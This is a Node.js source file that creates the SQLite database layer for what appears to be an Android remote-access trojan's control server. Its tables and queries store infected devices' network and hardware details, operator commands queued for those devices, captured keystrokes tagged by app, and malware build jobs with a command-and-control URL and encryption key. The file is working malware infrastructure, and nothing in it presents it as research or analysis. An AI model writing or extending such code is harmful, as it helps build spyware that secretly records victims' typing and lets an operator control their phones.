import Database from 'better-sqlite3';
import { readFileSync, existsSync, mkdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { log } from '../utils.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

/**
 * Initialize the SQLite database.
 * Creates the file + tables if they don't exist.
 * Runs migrations from schema.sql.
 */
export function initDatabase(config) {
  const dbPath = config.dbPath;
const dir = dirname(dbPath);

mkdirSync(dir, { recursive: true });

const db = new Database(dbPath);
  // Performance pragmas
  db.pragma('journal_mode = WAL');
  db.pragma('foreign_keys = ON');
  db.pragma('busy_timeout = 5000');
  db.pragma('synchronous = NORMAL');
  db.pragma('cache_size = -64000'); // 64MB

  // Run schema
  const schemaPath = join(__dirname, 'schema.sql');
  if (existsSync(schemaPath)) {
    const schema = readFileSync(schemaPath, 'utf-8');
    // Split by semicolons and execute each statement
    const statements = schema
      .split(';')
      .map(s => s.trim())
      .filter(s => s.length > 0 && !s.startsWith('--'));
    for (const stmt of statements) {
      try {
        db.exec(stmt + ';');
      } catch (err) {
        log('warn', 'Schema statement skipped', { error: err.message, sql: stmt.slice(0, 80) });
      }
    }
  }

  // Prepare common statements for reuse
  const stmts = {
    // Devices
    upsertDevice: db.prepare(`
      INSERT INTO devices (id, token, name, manufacturer, model, android_version, sdk_version,
        security_patch, carrier, public_ip, local_ip, signal_strength, is_online, last_seen_at,
        battery_level, is_charging, capabilities)
      VALUES (@id, @token, @name, @manufacturer, @model, @androidVersion, @sdkVersion,
        @securityPatch, @carrier, @publicIp, @localIp, @signalStrength, @isOnline, @lastSeenAt,
        @batteryLevel, @isCharging, @capabilities)
      ON CONFLICT(id) DO UPDATE SET
        token = COALESCE(@token, token),
        name = COALESCE(@name, name),
        manufacturer = COALESCE(@manufacturer, manufacturer),
        model = COALESCE(@model, model),
        android_version = COALESCE(@androidVersion, android_version),
        sdk_version = COALESCE(@sdkVersion, sdk_version),
        security_patch = COALESCE(@securityPatch, security_patch),
        carrier = COALESCE(@carrier, carrier),
        public_ip = COALESCE(@publicIp, public_ip),
        local_ip = COALESCE(@localIp, local_ip),
        signal_strength = COALESCE(@signalStrength, signal_strength),
        is_online = COALESCE(@isOnline, is_online),
        last_seen_at = COALESCE(@lastSeenAt, last_seen_at),
        battery_level = COALESCE(@batteryLevel, battery_level),
        is_charging = COALESCE(@isCharging, is_charging),
        capabilities = COALESCE(@capabilities, capabilities)
    `),

    getDeviceByToken: db.prepare('SELECT * FROM devices WHERE token = ?'),
    getDeviceById: db.prepare('SELECT * FROM devices WHERE id = ?'),
    getAllDevices: db.prepare('SELECT * FROM devices ORDER BY last_seen_at DESC'),
    getOnlineDevices: db.prepare('SELECT * FROM devices WHERE is_online = 1 ORDER BY last_seen_at DESC'),

    setDeviceOnline: db.prepare(
      'UPDATE devices SET is_online = 1, last_seen_at = ? WHERE id = ?'
    ),
    setDeviceOffline: db.prepare(
      'UPDATE devices SET is_online = 0 WHERE id = ?'
    ),
    setAllDevicesOffline: db.prepare('UPDATE devices SET is_online = 0'),

    deleteDevice: db.prepare('DELETE FROM devices WHERE id = ?'),

    // Commands
    insertCommand: db.prepare(`
      INSERT INTO commands (id, device_id, type, payload, status, operator_id)
      VALUES (@id, @deviceId, @type, @payload, @status, @operatorId)
    `),
    getPendingCommands: db.prepare(
      'SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC'
    ),
    getPendingCommandsForDevice: db.prepare(
      'SELECT * FROM commands WHERE device_id = ? AND status = \'pending\' ORDER BY created_at ASC'
    ),
    updateCommandStatus: db.prepare(
      'UPDATE commands SET status = ?, sent_at = COALESCE(? , sent_at), result = COALESCE(?, result), result_at = COALESCE(?, result_at), error = COALESCE(?, error) WHERE id = ?'
    ),
    getCommandsByDevice: db.prepare(
      'SELECT * FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 100'
    ),

    // Audit
    insertAudit: db.prepare(`
      INSERT INTO audit_logs (id, user_id, action, target_type, target_id, details, ip)
      VALUES (@id, @userId, @action, @targetType, @targetId, @details, @ip)
    `),
    getAuditLogs: db.prepare(
      'SELECT * FROM audit_logs ORDER BY created_at DESC LIMIT ?'
    ),

    // Keylogs
    insertKeylog: db.prepare(`
      INSERT INTO keylogs (device_id, package_name, key_event, text, captured_at)
      VALUES (@deviceId, @packageName, @keyEvent, @text, @capturedAt)
    `),
    getKeylogs: db.prepare(
      'SELECT * FROM keylogs WHERE device_id = ? ORDER BY captured_at DESC LIMIT ?'
    ),

    // Builds
    insertBuild: db.prepare(`
      INSERT INTO build_jobs (id, status, package_name, icon_url, build_config, c2_url, encryption_key, requested_by)
      VALUES (@id, @status, @packageName, @iconUrl, @buildConfig, @c2Url, @encryptionKey, @requestedBy)
    `),
    updateBuild: db.prepare(`
      UPDATE build_jobs SET status = ?, workflow_run_id = ?, apk_url = ?, error = ?, completed_at = ? WHERE id = ?
    `),
    getBuild: db.prepare('SELECT * FROM build_jobs WHERE id = ?'),
    getBuilds: db.prepare('SELECT * FROM build_jobs ORDER BY created_at DESC LIMIT 50'),

    // Groups
    getGroups: db.prepare('SELECT * FROM device_groups ORDER BY name'),
    getGroup: db.prepare('SELECT * FROM device_groups WHERE id = ?'),
    createGroup: db.prepare(
      'INSERT INTO device_groups (id, name, description) VALUES (@id, @name, @description)'
    ),
    deleteGroup: db.prepare('DELETE FROM device_groups WHERE id = ?'),

    // Users
    getUserByUsername: db.prepare('SELECT * FROM users WHERE username = ?'),
    getUserById: db.prepare('SELECT * FROM users WHERE id = ?'),
    createUser: db.prepare(`
      INSERT INTO users (id, username, password_hash, role)
      VALUES (@id, @username, @passwordHash, @role)
    `),
    updateUserLogin: db.prepare(
      'UPDATE users SET last_login_at = ? WHERE id = ?'
    ),
  };

  return { db, stmts };
}
